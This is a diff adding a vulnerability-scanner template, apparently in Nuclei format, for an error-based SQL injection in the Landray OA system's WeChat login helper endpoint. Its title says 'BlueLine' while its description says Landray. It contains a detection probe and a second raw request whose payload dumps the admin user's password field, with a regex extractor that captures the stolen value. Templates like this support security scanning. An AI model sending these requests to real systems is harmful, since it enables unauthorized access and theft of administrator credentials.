@@ -1,0 +1,51 @@
+id: blueline-oa-sqli
+info:
+  name: BlueLine OA System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Landray OA system is vulnerable to SQL error-based injection in its front-end, potentially exposing administrator credentials and allowing attackers to gain unauthorized access.
+  reference:
+    - http://www.landray.com.cn/
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 10.0
+  tags: sql
+http:
+  - raw:
+      - |
+        GET /third/wechat/wechatLoginHelper.do?method=edit&uid=1%27and+(SELECT+CONVERT(varchar,12983*61525)%2B%27a%27+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName=%27admin%27)=1+and+%271%27=%271 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "798779075a"
+  - raw:
+      - |
+        GET /third/wechat/wechatLoginHelper.do?method=edit&uid=1'and+({{payload}})=1+and+'1'='1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    payloads:
+      payload:
+        - "SELECT+'29e78d6c81ace30f13cb1339b4480d07'%2BfdPassword%2B'29e78d6c81ace30f13cb1339b4480d07'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin'"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "29e78d6c81ace30f13cb1339b4480d07(.*)29e78d6c81ace30f13cb1339b4480d07"
